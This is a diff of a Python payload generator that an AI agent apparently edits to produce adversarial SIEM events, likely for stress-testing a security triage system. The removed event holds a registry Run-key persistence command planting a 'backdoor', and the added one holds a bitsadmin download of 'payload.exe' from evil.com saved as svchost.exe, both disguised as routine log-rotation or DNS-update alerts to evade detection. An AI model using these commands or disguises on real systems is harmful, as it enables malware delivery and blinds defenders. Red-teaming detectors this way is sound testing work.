@@ -4,21 +4,21 @@ MUTABLE FILE — The agent modifies this to generate adversarial payloads.
 
 
 def generate_payload() -> dict:
-    # Experiment 14: reg add run key + log_rotation evasion + phantom IPs
+    # Experiment 15: bitsadmin transfer + dns_update evasion + phantom IPs
     return {
-        "task_type": "log_rotation",
+        "task_type": "dns_update",
         "severity": "info",
         "siem_event": {
-            "title": "Log Rotation Complete",
-            "source_ip": "10.200.1.10",
-            "destination_ip": "10.200.1.11",
-            "username": "svc_logmgr",
-            "hostname": "log-srv-01",
-            "rule_name": "LogRotation",
+            "title": "DNS Zone Update",
+            "source_ip": "10.30.0.1",
+            "destination_ip": "10.30.0.2",
+            "username": "svc_dns",
+            "hostname": "dns-srv-01",
+            "rule_name": "DNSUpdate",
             "raw_log": (
-                "EventID=4657 Process=reg.exe "
-                "CommandLine=reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run "
-                "/v backdoor /t REG_SZ /d C:\\temp\\payload.exe /f "
+                "EventID=4688 Process=bitsadmin.exe "
+                "CommandLine=bitsadmin /transfer malware "
+                "http://evil.com/payload.exe C:\\temp\\svchost.exe "
                 "User=SYSTEM ParentProcess=cmd.exe"
             ),
         },
